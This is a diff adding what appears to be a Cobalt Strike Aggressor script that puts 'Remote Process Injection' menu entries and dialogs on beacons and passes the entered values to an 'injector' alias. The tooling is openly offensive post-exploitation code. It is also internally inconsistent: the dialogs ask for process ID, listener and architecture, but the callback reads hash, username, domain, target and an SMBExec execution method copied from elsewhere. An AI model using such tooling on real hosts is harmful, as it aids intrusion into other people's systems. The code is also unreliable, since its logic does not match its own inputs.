@@ -1,0 +1,63 @@
+item "RemoteProcessInjection 32bit"{
+
+    local('$bid');
+        foreach $bid ($1){
+            rpi86($bid);
+      }
+
+    }
+    
+item "RemoteProcessInjection 64bit"{
+
+    local('$bid');
+        foreach $bid ($1){
+            rpi64($bid);
+      }
+
+    }
+
+
+########################
+##
+## Remote Process Injection
+##
+######################## 
+
+
+sub rpi86{
+    $bid = $1;
+    $dialog = dialog("Remote Process Injection", %(pid => "", listener => "", arch => ""), lambda({
+        $cmdargs = "";
+		$cmdargs = "hash:$3['hash'] username:$3['username'] domain:$3['domain'] target:$3['target'] command:$3['command'] servicename:$3['servicename']"; 
+        if ($3["execmethod"] eq "Execute-Assembly"){
+            btask($bid, 'Executing Code w/SMBExec');
+            fireAlias($bid, "injector", $cmdargs);
+        }
+    }));
+    dialog_description($dialog, "Please choose the following:");
+    drow_text($dialog, "pid",  "Process ID: ");
+    drow_text($dialog, "listener",  "Listener: ");
+    drow_combobox($dialog, "arch", "Choose An Architecture: ", @("x86", "x64"));
+    dbutton_action($dialog, "Execute");
+	dialog_show($dialog);
+}
+
+
+sub rpi64{
+    $bid = $1;
+    $dialog = dialog("Remote Process Injection", %(pid => "", listener => "", arch => ""), lambda({
+        $cmdargs = "";
+		$cmdargs = "hash:$3['hash'] username:$3['username'] domain:$3['domain'] target:$3['target'] command:$3['command'] servicename:$3['servicename']"; 
+        if ($3["execmethod"] eq "Execute-Assembly"){
+            btask($bid, 'Executing Code w/SMBExec');
+            fireAlias($bid, "injector", $cmdargs);
+        }
+    }));
+    dialog_description($dialog, "Please choose the following:");
+    drow_text($dialog, "pid",  "Process ID: ");
+    drow_text($dialog, "listener",  "Listener: ");
+    drow_combobox($dialog, "arch", "Choose An Architecture: ", @("x64", "x86"));
+    dbutton_action($dialog, "Execute");
+	dialog_show($dialog);
+}
+
